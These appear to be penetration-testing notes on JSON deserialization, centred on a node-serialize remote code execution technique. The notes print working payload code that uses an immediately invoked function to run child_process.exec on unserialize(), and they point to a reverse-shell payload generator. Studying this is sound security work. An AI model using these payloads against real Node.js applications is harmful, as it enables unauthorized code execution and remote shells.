# JSON Deserialize

## General Primer

TODO: this should be in the checklist and re-vamped of how to detect and then exploit it.

Is JSON any better than a serialized object? Replacing Java/.NET serialize requires OOP support.

JSON libraries need to reconstruct objects by either:

- Calling default constructor and using reflection to set field values
- Calling default constructor and calling setters to set field values
- Calling "special" constructors, type converters or callbacks
- Calling common methods such as:
	1. hashcode(), toString(), equals(), finalize(), …
	2. Combinations of the previous ones

## NodeJS

### WhiteBox

RCE can be obtained with Immediately Invoked Function Expression (IIFE). I have used node-serialize version 0.0.4 for this research. For successful exploitation, arbitrary code execution should occur when untrusted input is passed into unserialize() function. The best way to create a payload is to use the serialize() function of the same module.

```javascript
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Which gives the following output.

```
$ node log.js
Serialized:
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

The problem is code execution won’t happen until you trigger the function corresponding to the rce property of the object. Later I figured out that we can use JavaScript’s [Immediately invoked function expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.

Now the `serialize()` function with the modified object code is called.

```javascript
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

oS we have the exploit payload:

```
$ node log.js
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Passing it to `unserialize()` function will result in code execution.

```javascript
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

You can use something like [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) for a reverse shell payload generation. Just make sure you make the function into an IIFE and call it appropriately.

```
$ python nodejsshell.py 127.0.0.1 1337
```

---
## References

- [OPSECX: Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)